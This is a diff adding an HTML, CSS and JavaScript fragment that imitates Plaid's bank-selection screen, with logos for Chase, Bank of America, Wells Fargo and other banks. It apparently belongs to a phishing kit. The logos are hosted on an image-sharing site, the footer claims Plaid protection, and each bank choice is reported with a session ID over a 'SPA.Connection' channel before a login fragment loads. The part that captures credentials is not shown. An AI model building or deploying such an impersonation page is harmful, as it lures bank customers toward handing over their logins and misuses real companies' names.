@@ -1,0 +1,745 @@
+<style>
+/* ═══════════════════════════════════════════════
+   PLAID DESIGN SYSTEM — shared across all fragments
+   ═══════════════════════════════════════════════ */
+:root {
+  --p-black:   #111111;
+  --p-navy:    #113b5e;
+  --p-blue:    #1a56ff;
+  --p-gray1:   #f5f5f5;
+  --p-gray2:   #e8e8e8;
+  --p-gray3:   #b0b0b0;
+  --p-gray4:   #6b6b6b;
+  --p-white:   #ffffff;
+  --p-green:   #0fa55a;
+  --p-red:     #e0341b;
+  --p-radius:  10px;
+  --p-shadow:  0 4px 24px rgba(0,0,0,0.10);
+  --p-trans:   all 0.22s cubic-bezier(.4,0,.2,1);
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+.p-wrap {
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 16px 12px 32px;
+  background: #f0f2f5;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  -webkit-font-smoothing: antialiased;
+}
+
+.p-card {
+  background: var(--p-white);
+  border-radius: 16px;
+  box-shadow: var(--p-shadow);
+  width: 100%;
+  max-width: 440px;
+  padding: 0;
+  overflow: hidden;
+}
+
+/* ── Top bar with Plaid logo ── */
+.p-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px 0;
+}
+.p-plaid-logo {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.p-plaid-logo img {
+  height: 22px;
+  width: auto;
+}
+.p-plaid-wordmark {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  color: var(--p-black);
+}
+.p-lock-icon {
+  width: 30px;
+  height: 30px;
+  background: var(--p-gray1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--p-gray4);
+  font-size: 13px;
+}
+
+/* ── Progress dots ── */
+.p-progress {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 14px 20px 0;
+}
+.p-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  background: var(--p-gray2);
+  transition: var(--p-trans);
+}
+.p-dot.active  { background: var(--p-black); transform: scale(1.2); }
+.p-dot.done    { background: var(--p-green); }
+.p-progress-bar-wrap {
+  padding: 14px 20px 0;
+}
+.p-progress-bar {
+  width: 100%;
+  height: 3px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.p-progress-bar-fill {
+  height: 100%;
+  background: var(--p-black);
+  border-radius: 2px;
+  transition: width 0.5s cubic-bezier(.4,0,.2,1);
+}
+
+/* ── Institution header ── */
+.p-inst-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 18px 20px 0;
+}
+.p-inst-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  flex-shrink: 0;
+  border: 1px solid var(--p-gray2);
+}
+.p-inst-logo img  { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-inst-logo svg  { width: 100%; height: 100%; }
+.p-inst-info h3   { font-size: 15px; font-weight: 600; color: var(--p-black); line-height: 1.2; }
+.p-inst-info span { font-size: 12.5px; color: var(--p-gray4); margin-top: 2px; display: block; }
+
+/* ── Body content ── */
+.p-body {
+  padding: 20px 20px 24px;
+}
+.p-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--p-black);
+  letter-spacing: -0.3px;
+  margin-bottom: 6px;
+}
+.p-sub {
+  font-size: 13.5px;
+  color: var(--p-gray4);
+  line-height: 1.55;
+  margin-bottom: 20px;
+}
+
+/* ── Input group ── */
+.p-field {
+  margin-bottom: 14px;
+}
+.p-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--p-gray4);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+}
+.p-input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  color: var(--p-black);
+  background: var(--p-white);
+  transition: var(--p-trans);
+  outline: none;
+  box-sizing: border-box;
+}
+.p-input:focus    { border-color: var(--p-black); box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+.p-input.p-error  { border-color: var(--p-red); }
+.p-input-wrap     { position: relative; }
+.p-input-wrap .p-input { padding-right: 44px; }
+.p-eye {
+  position: absolute;
+  right: 13px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--p-gray3);
+  font-size: 15px;
+  padding: 4px;
+}
+.p-eye:hover { color: var(--p-black); }
+
+/* ── Error message ── */
+.p-error-msg {
+  font-size: 12px;
+  color: var(--p-red);
+  margin-top: 5px;
+  display: none;
+}
+.p-error-msg.show { display: block; }
+
+/* ── Buttons ── */
+.p-btn {
+  width: 100%;
+  padding: 14px;
+  background: var(--p-black);
+  color: var(--p-white);
+  border: none;
+  border-radius: var(--p-radius);
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--p-trans);
+  letter-spacing: 0.1px;
+  margin-top: 4px;
+}
+.p-btn:hover    { background: #222; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(0,0,0,0.18); }
+.p-btn:active   { transform: translateY(0); }
+.p-btn:disabled { background: var(--p-gray2); color: var(--p-gray3); cursor: not-allowed; transform: none; box-shadow: none; }
+.p-btn-ghost {
+  width: 100%;
+  padding: 13px;
+  background: transparent;
+  color: var(--p-black);
+  border: 1.5px solid var(--p-gray2);
+  border-radius: var(--p-radius);
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: var(--p-trans);
+  margin-top: 10px;
+}
+.p-btn-ghost:hover { background: var(--p-gray1); border-color: var(--p-gray3); }
+
+/* ── Divider ── */
+.p-divider {
+  height: 1px;
+  background: var(--p-gray2);
+  margin: 18px 0;
+}
+
+/* ── Footer ── */
+.p-footer {
+  padding: 0 20px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  font-size: 12px;
+  color: var(--p-gray4);
+}
+.p-footer i { font-size: 11px; color: var(--p-green); }
+
+/* ── Loading spinner ── */
+.p-spinner {
+  display: inline-block;
+  width: 20px; height: 20px;
+  border: 2px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: pSpin 0.7s linear infinite;
+  vertical-align: middle;
+  margin-right: 8px;
+}
+@keyframes pSpin { to { transform: rotate(360deg); } }
+
+/* ── Generic bank SVG ── */
+.p-gen-bank svg { width: 100%; height: 100%; }
+
+
+/* ── Bank grid ── */
+.p-bank-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-bottom: 12px;
+}
+.p-bank-tile {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 7px;
+  padding: 12px 6px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: 12px;
+  cursor: pointer;
+  transition: var(--p-trans);
+  background: var(--p-white);
+  text-align: center;
+}
+.p-bank-tile:hover {
+  border-color: var(--p-black);
+  box-shadow: 0 3px 12px rgba(0,0,0,0.09);
+  transform: translateY(-2px);
+}
+.p-bank-tile:active { transform: translateY(0); }
+
+.p-bank-tile-logo {
+  width: 52px; height: 52px;
+  border-radius: 12px;
+  background: var(--p-gray1);
+  display: flex; align-items: center; justify-content: center;
+  overflow: hidden;
+  border: 1px solid var(--p-gray2);
+}
+.p-bank-tile-logo img { max-width: 80%; max-height: 80%; object-fit: contain; }
+.p-bank-tile-name {
+  font-size: 11.5px;
+  font-weight: 500;
+  color: var(--p-black);
+  line-height: 1.3;
+}
+
+/* Search tile */
+.p-search-tile {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 7px;
+  padding: 12px 6px;
+  border: 1.5px dashed var(--p-gray3);
+  border-radius: 12px;
+  cursor: pointer;
+  transition: var(--p-trans);
+  background: var(--p-gray1);
+}
+.p-search-tile:hover { border-style: solid; border-color: var(--p-black); background: #f0f0f0; }
+.p-search-tile i     { font-size: 20px; color: var(--p-gray4); }
+.p-search-tile span  { font-size: 11px; font-weight: 500; color: var(--p-gray4); text-align: center; line-height: 1.3; }
+
+/* ── Bottom sheet search ── */
+.p-bs-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.45);
+  z-index: 10001;
+  justify-content: center;
+  align-items: flex-end;
+}
+.p-bs-overlay.open { display: flex; }
+.p-bs-sheet {
+  background: var(--p-white);
+  border-radius: 20px 20px 0 0;
+  width: 100%;
+  max-width: 480px;
+  padding: 0 0 env(safe-area-inset-bottom, 0);
+  box-shadow: 0 -8px 40px rgba(0,0,0,0.15);
+  max-height: 84vh;
+  display: flex;
+  flex-direction: column;
+  animation: bsUp .26s cubic-bezier(.4,0,.2,1);
+}
+@keyframes bsUp { from { transform: translateY(60px); opacity:0; } to { transform:translateY(0); opacity:1; } }
+.p-bs-handle {
+  width: 38px; height: 4px;
+  background: var(--p-gray2);
+  border-radius: 2px;
+  margin: 12px auto 0;
+  flex-shrink: 0;
+}
+.p-bs-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 14px 16px 10px;
+  flex-shrink: 0;
+}
+.p-bs-input-wrap { position: relative; flex: 1; }
+.p-bs-input {
+  width: 100%;
+  padding: 11px 14px 11px 38px;
+  border: 1.5px solid var(--p-gray2);
+  border-radius: 10px;
+  font-size: 14.5px;
+  color: var(--p-black);
+  outline: none;
+  box-sizing: border-box;
+  transition: var(--p-trans);
+}
+.p-bs-input:focus { border-color: var(--p-black); }
+.p-bs-search-icon {
+  position: absolute; left: 12px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--p-gray3); font-size: 13px;
+}
+.p-bs-close {
+  background: var(--p-gray1); border: none;
+  border-radius: 50%; width: 32px; height: 32px;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; color: var(--p-gray4); font-size: 14px;
+  flex-shrink: 0;
+}
+.p-bs-close:hover { background: var(--p-gray2); color: var(--p-black); }
+
+/* Custom use-this bar */
+.p-custom-bar {
+  display: none;
+  align-items: center;
+  gap: 10px;
+  margin: 0 16px 10px;
+  padding: 10px 14px;
+  background: #f0f4ff;
+  border: 1.5px solid #c5d3f5;
+  border-radius: 10px;
+  flex-shrink: 0;
+}
+.p-custom-bar.show { display: flex; }
+.p-custom-label { flex: 1; font-size: 13px; color: #1a3a8f; line-height: 1.4; }
+.p-custom-label strong { display: block; font-size: 13.5px; font-weight: 700; }
+.p-custom-select-btn {
+  background: var(--p-black); color: white; border: none;
+  border-radius: 8px; padding: 8px 16px;
+  font-size: 12.5px; font-weight: 700; cursor: pointer;
+  white-space: nowrap; transition: var(--p-trans);
+}
+.p-custom-select-btn:hover { background: #333; }
+
+/* Results list */
+.p-bs-results {
+  overflow-y: auto; flex: 1;
+  padding: 0 16px 20px;
+}
+.p-bs-result {
+  display: flex; align-items: center;
+  padding: 10px 6px; gap: 12px;
+  border-radius: 10px; cursor: pointer;
+  transition: var(--p-trans);
+}
+.p-bs-result:hover { background: var(--p-gray1); }
+.p-bs-rlogo {
+  width: 38px; height: 38px; border-radius: 10px;
+  background: var(--p-gray1); border: 1px solid var(--p-gray2);
+  display: flex; align-items: center; justify-content: center;
+  overflow: hidden; flex-shrink: 0;
+}
+.p-bs-rlogo img { max-width: 78%; max-height: 78%; object-fit: contain; }
+.p-bs-rname { flex: 1; font-size: 13.5px; font-weight: 500; color: var(--p-black); }
+.p-bs-rbtn {
+  background: var(--p-black); color: white; border: none;
+  border-radius: 7px; padding: 6px 13px;
+  font-size: 12px; font-weight: 700; cursor: pointer;
+  flex-shrink: 0;
+}
+.p-bs-rbtn:hover { background: #333; }
+.p-bs-empty {
+  text-align: center; padding: 28px 12px;
+  font-size: 13.5px; color: var(--p-gray4); line-height: 1.6;
+}
+</style>
+
+<div class="p-wrap">
+  <div class="p-card">
+
+    <div class="p-topbar">
+      <div class="p-plaid-logo">
+        <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+        <span class="p-plaid-wordmark">plaid</span>
+      </div>
+      <div class="p-lock-icon"><i class="fas fa-lock"></i></div>
+    </div>
+
+    <div class="p-progress-bar-wrap">
+      <div class="p-progress-bar"><div class="p-progress-bar-fill" style="width:10%;"></div></div>
+    </div>
+
+    <div class="p-body" style="padding-bottom:8px;">
+      <p class="p-title">Select your bank</p>
+      <p class="p-sub">Choose your financial institution to connect your account.</p>
+    </div>
+
+    <!-- Bank grid -->
+    <div style="padding: 0 20px 20px;">
+      <div class="p-bank-grid">
+
+        <div class="p-bank-tile" onclick="window._pickBank('chase','Chase','https://i.ibb.co/BH9430KX/chase-blue.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/BH9430KX/chase-blue.png" alt="Chase"></div>
+          <span class="p-bank-tile-name">Chase</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('bofa','Bank of America','https://i.ibb.co/y2w6V8G/ids1vsu729-1758079371686.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/y2w6V8G/ids1vsu729-1758079371686.jpg" alt="BofA"></div>
+          <span class="p-bank-tile-name">Bank of America</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('wells','Wells Fargo','https://i.ibb.co/Vcj19wJc/idbjzebhkn-logos.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/Vcj19wJc/idbjzebhkn-logos.png" alt="Wells Fargo"></div>
+          <span class="p-bank-tile-name">Wells Fargo</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('citi','Citibank','https://i.ibb.co/3mgJGdTX/citi-bank-logo-1.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/3mgJGdTX/citi-bank-logo-1.png" alt="Citi"></div>
+          <span class="p-bank-tile-name">Citibank</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('usbank','US Bank','https://i.ibb.co/pvhd5yHk/us-bank-idavyamfbl-1.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/pvhd5yHk/us-bank-idavyamfbl-1.png" alt="US Bank"></div>
+          <span class="p-bank-tile-name">US Bank</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('pnc','PNC Bank','https://i.ibb.co/Vc4bf23M/pnc-bank-logo-5.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/Vc4bf23M/pnc-bank-logo-5.png" alt="PNC"></div>
+          <span class="p-bank-tile-name">PNC Bank</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('capital','Capital One','https://i.ibb.co/JwcqznRG/Capital-One-Logo-wine-1.png')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/JwcqznRG/Capital-One-Logo-wine-1.png" alt="Capital One"></div>
+          <span class="p-bank-tile-name">Capital One</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('td','TD Bank','https://i.ibb.co/Q3sF4CNz/idqe3psjod-1758079468390.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/Q3sF4CNz/idqe3psjod-1758079468390.jpg" alt="TD Bank"></div>
+          <span class="p-bank-tile-name">TD Bank</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('usaa','USAA','https://i.ibb.co/tp94skHY/idydqc7frk-1758079451738.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/tp94skHY/idydqc7frk-1758079451738.jpg" alt="USAA"></div>
+          <span class="p-bank-tile-name">USAA</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('navy','Navy Federal','https://i.ibb.co/cS0JS4vJ/navy-federal-credit-union-idkfoh6rpd-0.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/cS0JS4vJ/navy-federal-credit-union-idkfoh6rpd-0.jpg" alt="Navy Federal"></div>
+          <span class="p-bank-tile-name">Navy Federal</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('truist','Truist','https://i.ibb.co/xKwSrfPW/truist-financial-corp2760.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/xKwSrfPW/truist-financial-corp2760.jpg" alt="Truist"></div>
+          <span class="p-bank-tile-name">Truist Bank</span>
+        </div>
+
+        <div class="p-bank-tile" onclick="window._pickBank('regions','Regions','https://i.ibb.co/4R0R6ctf/idirksrgpl-logos.jpg')">
+          <div class="p-bank-tile-logo"><img src="https://i.ibb.co/4R0R6ctf/idirksrgpl-logos.jpg" alt="Regions"></div>
+          <span class="p-bank-tile-name">Regions Bank</span>
+        </div>
+
+        <!-- Search tile -->
+        <div class="p-search-tile" onclick="window._bsOpen()">
+          <i class="fas fa-search"></i>
+          <span>Search<br>your bank</span>
+        </div>
+
+      </div>
+
+      <p style="font-size:11.5px;color:var(--p-gray3);text-align:center;margin-top:4px;">
+        11,000+ financial institutions supported
+      </p>
+    </div>
+
+    <div class="p-footer">
+      <i class="fas fa-lock"></i>
+      <span>Protected by Plaid &amp; 256-bit SSL encryption</span>
+    </div>
+  </div>
+</div>
+
+<!-- Search bottom sheet -->
+<div class="p-bs-overlay" id="pBsOverlay">
+  <div class="p-bs-sheet">
+    <div class="p-bs-handle"></div>
+    <div class="p-bs-header">
+      <div class="p-bs-input-wrap">
+        <i class="fas fa-search p-bs-search-icon"></i>
+        <input type="text" class="p-bs-input" id="pBsInput"
+          placeholder="Search bank or credit union…"
+          autocomplete="off"
+          oninput="window._bsSearch(this.value)">
+      </div>
+      <button class="p-bs-close" onclick="window._bsClose()">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+
+    <!-- "Use this name" bar — appears after 2+ chars -->
+    <div class="p-custom-bar" id="pCustomBar">
+      <div class="p-custom-label">
+        <strong id="pCustomName"></strong>
+        Use this institution
+      </div>
+      <button class="p-custom-select-btn" onclick="window._bsSelectCustom()">
+        <i class="fas fa-check" style="margin-right:4px;"></i>Select
+      </button>
+    </div>
+
+    <div class="p-bs-results" id="pBsResults">
+      <p class="p-bs-empty">Start typing to search 40+ banks &amp; credit unions</p>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+
+  var KNOWN = [
+    {id:'chase',     name:'Chase',                  logo:'https://logo.clearbit.com/chase.com'},
+    {id:'bofa',      name:'Bank of America',        logo:'https://logo.clearbit.com/bankofamerica.com'},
+    {id:'wells',     name:'Wells Fargo',            logo:'https://logo.clearbit.com/wellsfargo.com'},
+    {id:'citi',      name:'Citibank',               logo:'https://logo.clearbit.com/citi.com'},
+    {id:'usbank',    name:'US Bank',                logo:'https://logo.clearbit.com/usbank.com'},
+    {id:'pnc',       name:'PNC Bank',               logo:'https://logo.clearbit.com/pnc.com'},
+    {id:'capital',   name:'Capital One',            logo:'https://logo.clearbit.com/capitalone.com'},
+    {id:'td',        name:'TD Bank',                logo:'https://logo.clearbit.com/td.com'},
+    {id:'ally',      name:'Ally Bank',              logo:'https://logo.clearbit.com/ally.com'},
+    {id:'discover',  name:'Discover Bank',          logo:'https://logo.clearbit.com/discover.com'},
+    {id:'navy',      name:'Navy Federal CU',        logo:'https://logo.clearbit.com/navyfederal.org'},
+    {id:'usaa',      name:'USAA',                   logo:'https://logo.clearbit.com/usaa.com'},
+    {id:'truist',    name:'Truist Bank',            logo:'https://logo.clearbit.com/truist.com'},
+    {id:'regions',   name:'Regions Bank',           logo:'https://logo.clearbit.com/regions.com'},
+    {id:'fifth',     name:'Fifth Third Bank',       logo:'https://logo.clearbit.com/53.com'},
+    {id:'citizens',  name:'Citizens Bank',          logo:'https://logo.clearbit.com/citizensbank.com'},
+    {id:'huntington',name:'Huntington Bank',        logo:'https://logo.clearbit.com/huntington.com'},
+    {id:'keybank',   name:'KeyBank',                logo:'https://logo.clearbit.com/key.com'},
+    {id:'comerica',  name:'Comerica Bank',          logo:'https://logo.clearbit.com/comerica.com'},
+    {id:'firsttech', name:'First Tech FCU',         logo:'https://logo.clearbit.com/firsttechfed.com'},
+    {id:'penfed',    name:'PenFed Credit Union',    logo:'https://logo.clearbit.com/penfed.org'},
+    {id:'alliant',   name:'Alliant Credit Union',   logo:'https://logo.clearbit.com/alliantcreditunion.org'},
+    {id:'schoolsfcu',name:'Schools FCU',            logo:'https://logo.clearbit.com/schoolsfcu.org'},
+    {id:'dcu',       name:'DCU',                    logo:'https://logo.clearbit.com/dcu.org'},
+    {id:'suncoast',  name:'Suncoast Credit Union',  logo:'https://logo.clearbit.com/suncoastcreditunion.com'},
+    {id:'golden1',   name:'Golden 1 Credit Union',  logo:'https://logo.clearbit.com/golden1.com'},
+    {id:'rbfcu',     name:'RBFCU',                  logo:'https://logo.clearbit.com/rbfcu.org'},
+    {id:'macu',      name:'Mountain America CU',    logo:'https://logo.clearbit.com/macu.com'},
+    {id:'becu',      name:'BECU',                   logo:'https://logo.clearbit.com/becu.org'},
+    {id:'ncsecu',    name:'State Employees CU',     logo:'https://logo.clearbit.com/ncsecu.org'},
+    {id:'vystar',    name:'VyStar Credit Union',    logo:'https://logo.clearbit.com/vystarcu.org'},
+    {id:'visions',   name:'Visions FCU',            logo:'https://logo.clearbit.com/visionsfcu.org'},
+    {id:'american',  name:'American Express',       logo:'https://logo.clearbit.com/americanexpress.com'},
+    {id:'synchrony', name:'Synchrony Bank',         logo:'https://logo.clearbit.com/synchronybank.com'},
+    {id:'marcus',    name:'Marcus by Goldman',      logo:'https://logo.clearbit.com/marcus.com'},
+    {id:'sofi',      name:'SoFi Bank',              logo:'https://logo.clearbit.com/sofi.com'},
+    {id:'chime',     name:'Chime',                  logo:'https://logo.clearbit.com/chime.com'},
+    {id:'fidelity',  name:'Fidelity',               logo:'https://logo.clearbit.com/fidelity.com'},
+    {id:'schwab',    name:'Charles Schwab Bank',    logo:'https://logo.clearbit.com/schwab.com'},
+    {id:'robinhood', name:'Robinhood',              logo:'https://logo.clearbit.com/robinhood.com'},
+    {id:'paypal',    name:'PayPal',                 logo:'https://logo.clearbit.com/paypal.com'},
+    {id:'venmo',     name:'Venmo',                  logo:'https://logo.clearbit.com/venmo.com'},
+  ];
+
+  var GEN_SVG = '<svg viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg"><rect width="38" height="38" rx="8" fill="#113b5e"/><path d="M19 6L32 13H6Z" fill="#82cde5"/><rect x="8" y="15" width="3" height="9" rx="1" fill="white"/><rect x="13" y="15" width="3" height="9" rx="1" fill="white"/><rect x="18" y="15" width="3" height="9" rx="1" fill="white"/><rect x="23" y="15" width="3" height="9" rx="1" fill="white"/><rect x="28" y="15" width="3" height="9" rx="1" fill="white"/><rect x="6" y="24" width="26" height="3" rx="1.5" fill="white"/></svg>';
+
+  var _query = '';
+
+  // ── Core pick: store + navigate ──────────────────────────────
+  window._pickBank = function(id, name, logo) {
+    window._selectedBank = { id: id, name: name, logo: logo || '' };
+    if (window.SPA && window.SPA.Connection) {
+      window.SPA.Connection.send({
+        type: 'bank_selected', bankId: id, bankName: name,
+        sessionId: window.SPA.Session ? window.SPA.Session.id() : ''
+      });
+    }
+    // Sync session_handler selectBank if available
+    if (window.selectBank) { try { window.selectBank(id, name, logo||''); } catch(e){} }
+    if (window.SPA) window.SPA.renderFragment('p_login_v1', 'Loading…');
+  };
+
+  // ── Bottom sheet ─────────────────────────────────────────────
+  window._bsOpen = function() {
+    var el = document.getElementById('pBsOverlay');
+    if (el) el.classList.add('open');
+    setTimeout(function() {
+      var i = document.getElementById('pBsInput');
+      if (i) i.focus();
+    }, 180);
+  };
+
+  window._bsClose = function() {
+    var el = document.getElementById('pBsOverlay');
+    if (el) el.classList.remove('open');
+    _query = '';
+    var i = document.getElementById('pBsInput');
+    if (i) i.value = '';
+    _bsReset();
+  };
+
+  function _bsReset() {
+    var bar = document.getElementById('pCustomBar');
+    var res = document.getElementById('pBsResults');
+    if (bar) bar.classList.remove('show');
+    if (res) res.innerHTML = '<p class="p-bs-empty">Start typing to search 40+ banks &amp; credit unions</p>';
+  }
+
+  window._bsSearch = function(q) {
+    _query = (q || '').trim();
+    var bar  = document.getElementById('pCustomBar');
+    var name = document.getElementById('pCustomName');
+    var res  = document.getElementById('pBsResults');
+    if (!res) return;
+
+    if (_query.length < 2) { _bsReset(); return; }
+
+    // Always show custom bar
+    if (name) name.textContent = _query;
+    if (bar)  bar.classList.add('show');
+
+    var hits = KNOWN.filter(function(b) {
+      return b.name.toLowerCase().indexOf(_query.toLowerCase()) !== -1;
+    });
+
+    if (hits.length === 0) {
+      res.innerHTML = '<p class="p-bs-empty">No matches found.<br>Use the <strong>Select</strong> button above to proceed with "<strong>' + _esc(_query) + '</strong>".</p>';
+      return;
+    }
+
+    res.innerHTML = hits.map(function(b) {
+      var logoHtml = '<img src="' + b.logo + '" alt="' + _esc(b.name) + '" ' +
+        'onerror="this.outerHTML=\'' + GEN_SVG.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\'">';
+      return '<div class="p-bs-result">' +
+        '<div class="p-bs-rlogo">' + logoHtml + '</div>' +
+        '<span class="p-bs-rname">' + _esc(b.name) + '</span>' +
+        '<button class="p-bs-rbtn" onclick="window._bsPick(\'' + _escA(b.id) + '\',\'' + _escA(b.name) + '\',\'' + _escA(b.logo) + '\')">Select</button>' +
+      '</div>';
+    }).join('');
+  };
+
+  window._bsPick = function(id, name, logo) {
+    window._bsClose();
+    window._pickBank(id, name, logo);
+  };
+
+  window._bsSelectCustom = function() {
+    if (!_query) return;
+    var id = 'custom_' + _query.toLowerCase().replace(/\s+/g,'_').replace(/[^a-z0-9_]/g,'');
+    window._bsClose();
+    window._pickBank(id, _query, '');
+  };
+
+  // ── Legacy alias ─────────────────────────────────────────────
+  // NOTE: must NOT call _pickBank here (causes infinite recursion).
+  // Just sync the selection — session_handler's selectBank was overridden
+  // so we do a clean assignment only.
+  window.selectBank = function(id, name, logo) {
+    window._selectedBank = { id: id, name: name, logo: logo || '' };
+  };
+
+  function _esc(s)  { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function _escA(s) { return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
+
+})();
+</script>
